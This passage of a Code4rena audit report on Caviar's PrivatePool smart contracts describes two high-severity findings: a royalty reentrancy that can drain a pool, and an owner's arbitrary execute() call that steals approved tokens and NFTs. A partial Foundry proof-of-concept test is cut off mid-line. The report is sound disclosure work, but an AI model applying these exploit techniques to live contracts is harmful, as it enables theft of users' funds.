class=\"mtk12\">MerkleMultiProof</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">242</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// get the royalty fee for the NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">244</span><span class=\"mtk1\">:        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">,) = </span><span class=\"mtk11\">_getRoyalty</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit _getRoyalty called 1st time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">245</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">246</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// add the royalty fee to the total royalty fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">247</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">royaltyFeeAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">248</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">273</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// get the royalty fee for the NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">274</span><span class=\"mtk1\">:    (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_getRoyalty</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit  _getRoyalty called 2nd time</span></span></span></code></pre>\n<p>This is problematic because an attacker could potentially change the royalty fee between the two calls, due to the following untrusted external call:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L267-L268\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L267-L268</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        #</span><span class=\"mtk11\">buy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[],</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[],</span><span class=\"mtk12\">MerkleMultiProof</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">267</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// refund any excess ETH to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">268</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">) </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit untrusted external call</span></span></span></code></pre>\n<p>If the <code>msg.sender</code> is a malicious contract that has control over the <code>royaltyFee</code> for the NFTs that are being bought, they can change it, for example, from 0 basis points (0%) to 10000 basis points (100%) in their <code>receive()</code> function.</p>\n<p><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/common/ERC2981.sol#L94-L99\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/common/ERC2981.sol#L94-L99</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// @audit An attacker can call this setter function between the two `_getRoyalty()` calls.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_setTokenRoyalty</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeNumerator</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">95</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feeNumerator</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">_feeDenominator</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;ERC2981: royalty fee will exceed salePrice&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;ERC2981: Invalid parameters&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">97</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">98</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">_tokenRoyaltyInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">RoyaltyInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">feeNumerator</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">99</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>That way, the amount transferred by the <code>msg.sender</code> for royalties will be 0 because the total <code>royaltyFeeAmount</code> is calculated based on the first value (0%) but the actual sent amount to the receiver is determined by the second value (100%). This will result in the whole price paid for the NFT being returned to the royalty receiver, but being paid by the Pool instead of the <code>msg.sender</code>.</p>\n<p>The <code>msg.sender</code> has therefore received the NFT but paid the whole price for it to the royalty receiver and 0 to the Pool. If the <code>msg.sender</code> is the royalty receiver, they will basically have spent 0 base tokens (not counting gas expenses) but received the NFT in their account. They can then sell it to the same private pool to exchange it for base tokens.</p>\n<p>This is an extreme scenario, however, the developers have acknowledged ERC-2981 and that <code>royaltyInfo(...)</code> returns an arbitrary address. In the future we could see projects that have royalty payments that fluctuate such as increasing/decaying royalties over time <a href=\"https://www.gemini.com/blog/exploring-the-nft-royalty-standard-eip-2981\">article on eip 2981</a> or projects that delegate the creation of nfts to the users such as 1024pixels <a href=\"0x1024Accd05Fa01AdbB74502DBDdd8e430d610c53\">polygon</a>, <a href=\"https://github.com/michaelliao/1024pixels/blob/master/contracts/1024pixels.sol\">git repo</a> and royalties are paid to each user rather to a single creator. In such cases invocation of <code>_getRoyalty(...)</code>  twice with external calls that transfer assets in-between is a vulnerable pattern that is sure to introduce asset risks and calculation inaccuracies both for the users and protocol itself. Immediate remedy would be to simplify <code>buy(...)</code> in <code>PrivatePool.sol</code> to use only one <code>for loop</code> and call <code>_getRoyalty(...)</code> once.</p>\n<p>PoC shows how the entire Pool’s base tokens can be drained by a single royalty receiver using a single NFT assuming that the royalty receiver has control over the royaltyFee.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>See warden’s <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/320\">original submission</a> for full Proof of Concept.</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Ensure that the amount sent to the NFT royalty receivers in the second <code>for</code> loop in <code>buy()</code> is the same as the amount calculated in the first <code>for</code> loop.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/320#issuecomment-1529062037\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, because of reEntrancy and due to the same call being performed for royalties, a malicious royalty recipient can drain the pool of all funds.</p>\n<p>I have considered downgrading the finding because of the conditionality of the royalty recipient being malicious, however, I don’t believe this can be considered an external condition, as any account able to change the royalty setting could willingly or unwillingly enable the attack.</p>\n<p>For this reason I believe that the finding is of High Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/593#issuecomment-1520075272\">outdoteth (Caviar) confirmed via duplicate issue <code>#593</code> and mitigated</a>:</strong></p>\n<blockquote>\n<p>Fixed in: <a href=\"https://github.com/outdoteth/caviar-private-pools/pull/12\">https://github.com/outdoteth/caviar-private-pools/pull/12</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-privatepool-owner-can-steal-all-erc20-and-nft-from-user-via-arbitrary-execution\" style=\"position:relative;\"><a href=\"#h-02-privatepool-owner-can-steal-all-erc20-and-nft-from-user-via-arbitrary-execution\" aria-label=\"h 02 privatepool owner can steal all erc20 and nft from user via arbitrary execution permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/184\">[H-02] PrivatePool owner can steal all ERC20 and NFT from user via arbitrary execution</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/184\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/976\">ElKu</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/910\">ulqiorra</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/901\">decade</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/869\">minhtrng</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/842\">Koolex</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/821\">nemveer</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/801\">said</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/781\">Norah</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/766\">giovannidisiena</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/727\">oxen</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/709\">JGcarv</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/707\">JGcarv</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/673\">Noro</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/597\">sces60107</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/558\">Voyvoda</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/530\">teddav</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/332\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/218\">nobody2018</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/186\">0x4non</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/185\">sashik_eth</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/145\">Emmanuel</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/63\">0xTheC0der</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/29\">Ruhum</a></em></p>\n<p>In the current implementation of the PrivatePool.sol, the function execute is meant to claim airdrop, however, we cannot assume the owner is trusted because anyone can permissionlessly create private pool.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Executes a transaction from the pool account to a target contract. The caller must be the owner of the</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// pool. This allows for use cases such as claiming airdrops.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param target The address of the target contract.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param data The data to send to the target contract.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @return returnData The return data of the transaction.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// call the target with the value and data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">returnData</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">target</span><span class=\"mtk1\">.</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// if the call succeeded return the return data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">success</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">returnData</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// if we got an error bubble up the error message</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">returnData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// solhint-disable-next-line no-inline-assembly</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">returnData_size</span><span class=\"mtk1\"> := </span><span class=\"mtk10\">mload</span><span class=\"mtk1\">(</span><span class=\"mtk10\">returnData</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk7\">32</span><span class=\"mtk1\">, </span><span class=\"mtk12\">returnData</span><span class=\"mtk1\">), </span><span class=\"mtk12\">returnData_size</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">revert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The owner of private pool can easily steal all ERC20 token and NFT from the user’s wallet after the user gives approval to the PrivatePool contract and the user has to give the approval to the pool to let the PrivatePool pull ERC20 token and NFT from the user when user buy or sell or change from EthRouter or directly calling PrivatePool.</p>\n<p>The POC below shows, the owner of the PrivatePool can carefully craft payload to steal funds via arbitrary execution.</p>\n<p>After user’s apporval, the target can be an ERC20 token address or a NFT address, the call data can be the payload of transferFrom or function.</p>\n<p>Please add the code to Execute.t.sol so we can create a mock token:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MyToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MyToken&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;MTK&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Please add the POC below to Execute.t.sol:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testStealFundArbitrary_POC</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MyToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MyToken</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">victim</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1040341830</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hacker</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">14141231201</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;token balance of victim before hack&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">victim</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span 